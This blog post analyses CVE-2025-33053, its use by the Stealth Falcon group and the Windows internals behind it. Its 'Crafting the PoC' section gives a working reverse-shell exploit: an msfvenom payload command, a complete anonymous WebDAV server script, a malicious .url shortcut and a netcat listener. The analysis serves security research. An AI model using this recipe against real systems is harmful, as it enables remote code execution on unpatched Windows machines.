+++
showdate = true
title = "CVE-2025-33053 Analysis"
date = 2024-10-06
url = "/blog/CVE-2025-33053-Analysis"
mermaidInitialize = '{ "width": 800, "height": 500 }' 
+++

## Introduction
Hello fellow researcher! In this blogpost, we are going to do a deep analysis of [CVE-2025-33053](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33053). How this simple yet sneaky tactic was/is being used by APT Group Stealth Falcon. [Stealth Falcon](https://malpedia.caad.fkie.fraunhofer.de/actor/stealth_falcon), also known as Project Raven, G0038, and FruityArmor, is a cyberespionage group linked to the United Arab Emirates (UAE). They have been active since at least 2012, targeting political activists, journalists, and dissidents primarily in the Middle East, including the UAE, as well as individuals and entities in countries like the Netherlands, Saudi Arabia, Thailand, and the United Kingdom. 

While there's no definitive proof, [MITRE ATT&CK](https://attack.mitre.org/groups/G0038/) says that circumstantial evidence suggests a potential connection between Stealth Falcon and the UAE government. Researchers like Citizen Lab have published reports detailing the group's tactics, techniques, and procedures (TTPs), which include spear-phishing attacks, PowerShell macros, URL shorteners, and social engineering. Some reports also link Stealth Falcon to Project Raven, an initiative allegedly involving former NSA operatives.

## CVE Details
**NVD:** External control of file name or path in Internet Shortcut Files allows an unauthorized attacker to execute code over a network.

**MSRC:** While Microsoft has announced retirement of the Internet Explorer 11 application on certain platforms and the Microsoft Edge Legacy application is deprecated, the underlying MSHTML, EdgeHTML, and scripting platforms are still supported. The MSHTML platform is used by Internet Explorer mode in Microsoft Edge as well as other applications through WebBrowser control. The EdgeHTML platform is used by WebView and some UWP applications. The scripting platforms are used by MSHTML and EdgeHTML but can also be used by other legacy applications. Updates to address vulnerabilities in the MSHTML platform and scripting engine are included in the IE Cumulative Updates; EdgeHTML and Chakra changes are not applicable to those platforms.

## Stealth Falcon Attack Strategy
According Checkpoint's research, the following are the steps involved in Stealth Falcon's attack strategy.

- **Initial Compromise**
    
    --  Stealth Falcon initiates attacks through sophisticated phishing email campaigns that contain ZIP archive attachments designed to bypass email security filters

    --  The threat actors pack malicious `.url` files as legitimate PDF documents within the ZIP file to bypass Mark of the Web and smart screen related checks 

    --  The attack chain is designed to require minimal user interaction, typically just a double-click on what appears to be a standard PDF file

- **CVE-2025-33053 Exploitation**
    --  The core vulnerability exploitation involves manipulating the WorkingDirectory parameter in malicious `.url` files to point to attacker-controlled WebDAV servers

    --  Stealth Falcon leverages Windows' Dynamic Link Library search order mechanism to hijack the loading process and force the system to load malicious executables before legitimate ones

    --  The attack successfully bypasses Windows System32 directory protections by ensuring the malicious `route.exe` is discovered and loaded before the legitimate system executable

    --  This technique achieves fileless execution by loading malicious code directly from remote WebDAV shares without dropping any persistent files on the victim's local filesystem

- **Streamlined Multi-Layer Attack Implementation**

    --  **Two-Stage Payload Deployment:** Employs Horus Loader for initial access with anti-analysis capabilities, followed by Horus Agent (Mythic-based implant) that injects into legitimate processes like msedge.exe while displaying decoy PDFs to maintain stealth.

    --  **Advanced Evasion Framework:** Implements Code Virtualizer protection, manual DLL mapping, and scans for 100+ security processes. Uses custom OLLVM obfuscation, string encryption, control flow flattening, and API hashing to prevent reverse engineering.

    --  **IPfuscation Steganography:**  Conceals payload components within IPv6 address structures to evade network-based detection systems, demonstrating sophisticated understanding of security monitoring blind spots.

    --  **Resilient C2 Infrastructure:** Secures communications with AES-256 encryption and HMAC-SHA256 integrity verification across multiple domains (up to 4 servers) for operational redundancy and takedown resistance.

    --  **Comprehensive Espionage Platform:** Conducts detailed system fingerprinting and environment analysis while maintaining long-term persistence through remote command execution, file operations, and shellcode injection for intelligence gathering.

    --  **Living-Off-The-Land Integration:** Leverages legitimate Windows functionality and processes to maintain operational security, making detection significantly more challenging for traditional security tools and analysts.

```mermaid
flowchart LR
    subgraph Col1 ["Initial Attack Vector"]
        direction TB
        A["📧 Phishing Email<br/>🔗 ZIP Attachment<br/>📎 Social Engineering"] 
        B["📦 Victim Opens Archive<br/>🗂️ Extracts Contents<br/>👁️ Sees 'PDF' File"]
        C["🎭 Malicious LM.005 TELESCOPIC MAST DAMAGE REPORT.pdf.url File<br/>📄 Disguised as PDF<br/>⚠️ Contains WebDAV Path"]
        D["👆 User Double-Clicks<br/>🚀 Triggers Execution<br/>⏰ Attack Initiated"]
        
        A --> B --> C --> D
        
        style A fill:#2d3436,stroke:#636e72,color:#ddd
        style B fill:#34495e,stroke:#7f8c8d,color:#ecf0f1
        style C fill:#e17055,stroke:#d63031,color:#fff
        style D fill:#f39c12,stroke:#e67e22,color:#2d3436
    end
    
    subgraph Col2 ["Windows Shell Processing"]
        direction TB
        E["Windows Shell Invoked<br/> Parses LM.005 TELESCOPIC MAST DAMAGE REPORT.pdf.url File<br/>Reads Parameters"]
        F["ShellExecuteEx API<br/> SHELLEXECUTEINFO Struct<br/> lpDirectory Parameter"]
        G["WorkingDirectory Set to Remote WebDav Share<br/>"]
        H["iediagcmd.exe Launched<br/> Process Created with </br> Remote Working Directory <br/>"]
        
        E --> F --> G --> H
        
        style E fill:#2c3e50,stroke:#34495e,color:#ecf0f1
        style F fill:#16a085,stroke:#1abc9c,color:#2d3436
        style G fill:#00b894,stroke:#00cec9,color:#2d3436
        style H fill:#0984e3,stroke:#74b9ff,color:#fff
    end
    
    subgraph Col3 ["Exploitation"]
        direction TB
        I["⚠️ DLL Search Order Attack<br/>🔍 Windows LoadLibrary<br/>📋 Search Algorithm Abused"]
        J["❌ Step 1: Current Directory<br/>🔎 Searches WebDAV Path<br/>🚫 NO route.exe Found"]
        K["✅ Step 2: Remote Loading<br/>📥 Malicious route.exe Found<br/>🎭 Loaded from WebDAV"]
        L["🛡️ System32 Bypassed<br/>💀 Malicious Code Executed<br/>🏆 Exploit Successful"]
        
        I --> J --> K --> L
        
        style I fill:#c0392b,stroke:#e74c3c,color:#fff
        style J fill:#d35400,stroke:#e67e22,color:#fff
        style K fill:#e17055,stroke:#fd79a8,color:#2d3436
        style L fill:#8e44ad,stroke:#9b59b6,color:#fff
    end
    
    subgraph Col4 ["🔧 Stage 1: Horus Loader"]
        direction TB
        M["🐍 Horus Loader Activated<br/>🛡️ Anti-Analysis Suite<br/>🔒 Code Virtualizer"]
        N["🛡️ Evasion Techniques<br/>🔍 Scans 100+ AV Processes<br/>🧩 Manual DLL Mapping"]
        O["📄 Decoy PDF Displayed<br/>👁️ User Distraction<br/>🎭 Maintains Legitimacy"]
        P["🔢 IPfuscation Technique<br/>🌐 IPv6 Address Decoding<br/>📦 Payload Extraction"]
        
        M --> N --> O --> P
        
        style M fill:#27ae60,stroke:#2ecc71,color:#2d3436
        style N fill:#f39c12,stroke:#f1c40f,color:#2d3436
        style O fill:#95a5a6,stroke:#bdc3c7,color:#2d3436
        style P fill:#e67e22,stroke:#d35400,color:#fff
    end
    
    subgraph Col5 ["💉 Stage 2: Payload Inject"]
        direction TB
        Q["🎯 Target: msedge.exe<br/>💉 Process Injection<br/>🔧 Advanced Techniques"]
        R["⚡ System Call Arsenal<br/>📋 ZwAllocateVirtualMemory<br/>✍️ ZwWriteVirtualMemory<br/>▶️ NtResumeThread"]
        S["🤖 Horus Agent Deployed<br/>🔗 Mythic-Based Implant<br/>🎭 Heavy Obfuscation"]
        T["🛡️ Protection Layers<br/>🔀 OLLVM Techniques<br/>🔐 String Encryption<br/>🌀 Control Flow Flattening"]
        
        Q --> R --> S --> T
        
        style Q fill:#6c5ce7,stroke:#a29bfe,color:#fff
        style R fill:#fd79a8,stroke:#fdcb6e,color:#2d3436
        style S fill:#2d3436,stroke:#636e72,color:#ddd
        style T fill:#00cec9,stroke:#55efc4,color:#2d3436
    end
    
    subgraph Col6 ["🌐 Persistent Operations"]
        direction TB
        U["📋 Agent Registration<br/>🖥️ System Fingerprinting<br/>🔍 Environment Analysis"]
        V["📡 C2 Communication<br/>🔗 Multiple Domains<br/>⚡ Encrypted Channels"]
        W["🔐 AES-256 Encryption<br/>✅ HMAC-SHA256 Integrity<br/>🌐 Up to 4 C2 Domains"]
        X["🕵️ Espionage Operations<br/>⚡ Command Execution<br/>📁 File Operations<br/>💉 Shellcode Injection<br/>🔍 System Reconnaissance"]
        
        U --> V --> W --> X
        
        style U fill:#2c3e50,stroke:#34495e,color:#ecf0f1
        style V fill:#16a085,stroke:#1abc9c,color:#2d3436
        style W fill:#3742fa,stroke:#5f27cd,color:#fff
        style X fill:#8e44ad,stroke:#9b59b6,color:#fff
    end
    
    %% Inter-column connections with improved visibility
    Col1 -.->|"🔗 Triggers"| Col2
    Col2 -.->|"⚡ Exploits"| Col3  
    Col3 -.->|"🚀 Executes"| Col4
    Col4 -.->|"💉 Injects"| Col5
    Col5 -.->|"📡 Establishes"| Col6
    
    %% Dark mode-friendly subgraph styling with even spacing
    style Col1 fill:#2d343640,stroke:#e17055,stroke-width:3px
    style Col2 fill:#2d343640,stroke:#0984e3,stroke-width:3px
    style Col3 fill:#2d343640,stroke:#c0392b,stroke-width:3px
    style Col4 fill:#2d343640,stroke:#27ae60,stroke-width:3px
    style Col5 fill:#2d343640,stroke:#6c5ce7,stroke-width:3px
    style Col6 fill:#2d343640,stroke:#2c3e50,stroke-width:3px
```



## Crafting the PoC

This vulnerability can be exploited by using **ANY** [LOLBINS](https://lolbas-project.github.io). The only thing required is that the binary specified within `URL` parameter of the `.url` file must call the malicious executable file or `.dll` in the attacker hosted WebDAV server [More details given below].

For this example we are using [`iediagcmd.exe`](https://lolbas-project.github.io/lolbas/Binaries/Iediagcmd).

1. Create an reverse shell payload with the name `route.exe`. Msfvenom can be useful! Modify `LHOST` and `LPORT` parameters to suit your need.
    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.10  LPORT=9999 -f exe -o route.exe
    ``` 

2. Create a webdav server using WSGI-DAV in python by using the following code:
    ```python
    # required to be run in sudo mode if port 80 is what you wanna use

    import os
    import argparse
    from wsgidav.wsgidav_app import WsgiDAVApp
    from wsgidav.fs_dav_provider import FilesystemProvider
    from cheroot import wsgi

    # Configuration
    HOST = "0.0.0.0"  # Listen on all interfaces
    PORT = 80  # WebDAV port

    def setup_webdav_config(share_path):
        """Configure WSGIDav with the specified share directory."""
        return {
            "host": HOST,
            "port": PORT,
            "provider_mapping": {
                "/": FilesystemProvider(share_path)  # Map root to share directory
            },
            "simple_dc": {
                "user_mapping": {
                    "/": True  # Allow anonymous access to root
                }
            },
            "verbose": True,  # Simplified verbosity
            "property_manager": True,  # Enable property storage
            "lock_storage": True,  # WebDAV locking
        }

    if __name__ == "__main__":
        # Parse command-line arguments
        parser = argparse.ArgumentParser(description="Host a WebDAV share without authentication")
        parser.add_argument(
            "--dir",
            type=str,
            default="./webdav",
            help="Directory to share via WebDAV (default: ./webdav)"
        )
        args = parser.parse_args()

        # Validate and create share directory
        SHARE_PATH = os.path.abspath(args.dir)
        print(f"Parsed directory: {SHARE_PATH}")
        if not os.path.exists(SHARE_PATH):
            try:
                os.makedirs(SHARE_PATH)
                os.chmod(SHARE_PATH, 0o755)  # Ensure readable/writable
                print(f"Created share directory: {SHARE_PATH}")
            except OSError as e:
                print(f"Failed to create directory {SHARE_PATH}: {e}")
                exit(1)

        # Configure and start WebDAV server
        config = setup_webdav_config(SHARE_PATH)
        app = WsgiDAVApp(config)
        server = wsgi.Server((HOST, PORT), app)

        print(f"Starting WebDAV server on http://{HOST}:{PORT}")
        print(f"Shared directory: {SHARE_PATH}")
        print("No authentication required")
        print("Press Ctrl+C to stop")
        try:
            server.start()
        except KeyboardInterrupt:
            print("\nStopping WebDAV server...")
            server.stop()
    ```
    Run the `webdav.py` script. By default it points to a `./webdav` directory and creates a `./webdav` directory if it doesn't find any. 
    ```
    sudo python3 webdav.py
    ```
    You can move your payload to the webdav directory without shutting down the server. Or if you wanna change the directory to where your reverse shell payload is then you can use the `--dir` flag. Choice is yours! Always has been.

3. The vulnerability is in the capability of windows to execute PE files using webclient. Create a `.url` based file (eg: evil.pdf.url) like the one given below:
    ```
    [InternetShortcut]
    URL=C:\Program Files\Internet Explorer\iediagcmd.exe
    WorkingDirectory=\\192.168.10.10\webdav
    ShowCommand=7
    IconIndex=13
    IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
    Modified=20F06BA06D07BD014D
    ```
    This file uses `iediagcmd.exe` as it's LOLBIN, which in turn calls `route.exe` located in the Attacker controlled WebDAV server. 
    I have my default share of WebDAV server named as `/webdav`, hence the UNC path is `\\<ATTACKER_IP aka 192.168.10.10>\webdav`. If your share path is anywhere else you'll have to modify the `WorkingDirectory` parameter or the file.

4. Open a netcat listener on attacker machine.
    ```bash
    nc -vnlp 9999
    ```
    In this case the victim has to interact with the file to get a reverse shell.

## Why it works?

When a user interacts with a `.url` file in Windows, a series of internal processes are triggered that can be leveraged to execute code from a remote location, such as a WebDAV share. This analysis breaks down the internal mechanisms of Windows that enable this, focusing on the WorkingDirectory parameter and the role of WebDAV in loading executables.

### The Execution Flow of a .url File

The process begins when a user double-clicks a `.url` file. This action is handled by the Windows Shell, which uses the `ShellExecute` or `ShellExecuteEx` API functions from the `shell32.dll` library to process the file. `ShellExecuteEx` is a versatile function that can open or perform actions on any file type by identifying the default handler registered for that file's extension in the Windows Registry. For `.url` files, the registered handler is typically the Internet Shortcut file type. The shell then parses the contents of the `.url` file, which is a plain text file containing sections and key-value pairs. A specially crafted `.url` file can be used to launch a local executable instead of opening a web page.

### The Role of ShellExecuteEx and CreateProcessW
The `ShellExecuteEx` function uses a `SHELLEXECUTEINFO` structure to manage the execution. Key members of this structure in this context are:
```
lpFile: The path to the .url file itself.
lpDirectory: This sets the working directory for the new process.
nShow: Controls how the application's window is displayed (e.g., minimized, hidden).
```

`ShellExecuteEx` ultimately calls the `CreateProcessW` function to create a new process. `CreateProcessW` provides more granular control over the new process's creation. The parameters from the `.url` file and the `SHELLEXECUTEINFO` structure are passed to `CreateProcessW`.

### The Significance of the WorkingDirectory Parameter

The `WorkingDirectory` parameter within the `[InternetShortcut]` section of the `.url` file is crucial in this process. When the Windows Shell parses the `.url` file, it reads the value of `WorkingDirectory` and uses it to populate the `lpDirectory` member of the `SHELLEXECUTEINFO` structure. This value is then passed to the `lpCurrentDirectory` parameter of the `CreateProcessW` function. By setting the `WorkingDirectory` to a remote WebDAV share (e.g., `\\192.168.10.10\webdav`), an attacker can control the current directory of the newly created process. This has significant implications for how Windows loads required libraries.

### Windows DLL Search Order and Side-Loading
When a Windows application starts, it loads necessary Dynamic-Link Libraries (DLLs). The operating system searches for these DLLs in a specific order:

--  The directory from which the application is loaded.
    
--  The current directory for the process.
    
--  The 32-bit Windows system directory (typically `C:\Windows\System32`).
    
--  The 16-bit Windows system directory.
    
--  The Windows directory (typically `C:\Windows`).
    
--  The directories listed in the `PATH` environment variable.

The `WorkingDirectory` parameter directly influences the second step in this search order. By setting the current directory to a remote WebDAV share, an attacker can place a malicious DLL on that share with the same name as a legitimate DLL required by the application. When the application attempts to load the DLL, it will find and load the malicious version from the WebDAV share before it finds the legitimate version in the system directories. This is known as **DLL side-loading**.

### WebDAV and Remote Execution
The ability to load an executable or DLL from a WebDAV share as if it were on the local filesystem is facilitated by the `WebClient` service in Windows. The `WebClient` service allows Windows to access files on the internet using the `WebDAV` protocol. It runs within a `svchost.exe` process and relies on other services like `MRxDAV` (the WebDAV redirector). When an application, with its working directory set to a WebDAV share, requests to load a DLL, the WebClient service handles the request, retrieving the file from the remote server and providing it to the application's process. This allows the malicious DLL to be loaded into the memory of the legitimate process, effectively executing the attacker's code in the context of a trusted application

## References:
1. [Windows Binary Index](https://winbindex.m417z.com/)
2. [CheckPoint Research - Stealth Falcon 0-day](https://research.checkpoint.com/2025/stealth-falcon-zero-day/)
3. [Kaspersky Blogs on CVE-2025-33053](https://www.kaspersky.co.in/blog/cve-2025-33053-june-2025-patch-tuesday/28949/)